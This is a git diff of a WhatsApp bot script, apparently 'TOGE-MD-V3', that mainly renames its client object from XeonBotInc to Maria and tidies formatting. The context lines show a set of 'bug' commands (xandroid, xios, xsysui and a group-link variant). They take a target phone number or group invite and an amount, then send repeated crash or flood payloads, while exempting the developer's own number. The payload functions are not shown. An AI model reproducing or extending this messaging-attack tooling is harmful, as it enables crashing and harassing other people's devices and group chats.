@@ -2165,7 +2165,7 @@ function getRandomJoke() {
 break;
                          
                            
-  case 'menu': case 'help': case 'h': 
+  case 'menu': case 'help': case 'inumaki': 
       const txt = `┏━⍟ *TOGE-MD-V3* ⍟
 ┃✺ 𝖀𝖘𝖊𝖗: ${pushname} 
 ┃✺ 𝕭𝖔𝖙:  ${botname}
@@ -4509,7 +4509,7 @@ case 'ping':
   case 'mods':
 case 'developer':
 case 'dev':
-    const devmod = `  𝚑𝚒 𝚖𝚢 𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 𝚒𝚜 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚑𝚎𝚛𝚎 𝚊𝚛𝚎 𝚝𝚑𝚎𝚒𝚛 𝚗𝚞𝚖𝚋𝚎𝚛𝚜 @24105114159`;
+    const devmod = `𝚑𝚒 𝚖𝚢 𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 𝚒𝚜 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚑𝚎𝚛𝚎 𝚊𝚛𝚎 𝚝𝚑𝚎𝚒𝚛 𝚗𝚞𝚖𝚋𝚎𝚛𝚜 @24105114159`;
 
     Maria.sendMessage(m.chat, { text: devmod, mentions: ["24105114159@s.whatsapp.net", "24105114159@s.whatsapp.net", "24105114159@s.whatsapp.net","24102150169@s.whatsapp.net"] }, { quoted: m });
     break;
@@ -4908,7 +4908,7 @@ case "xandroid": {
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
   if (cleanedNumber == "24105114159") {
     return;
@@ -4940,7 +4940,7 @@ case "xios": {
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
   if (cleanedNumber == "24105114159") {
     return;
@@ -4973,7 +4973,7 @@ case "xios2":
       return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
     }
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+    reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
     await sleep(1500); // Adjusted sleep time for clarity
     sendMultiplePaymentInvites(from, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
@@ -4989,12 +4989,12 @@ case "xios2":
     }
     if (!text){
       return reply(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`);
-      }
+    }
     if (isNaN(parseInt(text))) {
       return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
     }
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+    replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..")
     await sleep(1500); // Adjusted sleep time for clarity
     sendVariousMessages(from, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
@@ -5007,14 +5007,14 @@ case "xios2":
     if (!text) {
       return reply("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
     }
-    reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+    reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..")
     if (!text.split(" ")[0].includes("whatsapp.com")) {
       return reply("𝕷𝖎𝖓𝖐 𝕴𝖓𝖛𝖆𝖑𝖎𝖉");
     }
     let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
     try {
       let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
-      let groupTarget = await XeonBotInc.groupAcceptInvite(groupLink);
+      let groupTarget = await Maria.groupAcceptInvite(groupLink);
       await sleep(2000); // Adjusted sleep time for clarity
       sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
@@ -5039,7 +5039,7 @@ case "xios2":
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
   if (cleanedNumber == "24105114159") {
     return
@@ -5072,7 +5072,7 @@ case "xsysui": {
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  var contactInfo = await Maria.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
   if (cleanedNumber == "24105114159") {
     return;
@@ -5094,7 +5094,7 @@ break
 	
 case 'clearall': {
 if (!isCreator) return reply(mess.owner);
-XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
+Maria.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
 }
 break;
 		
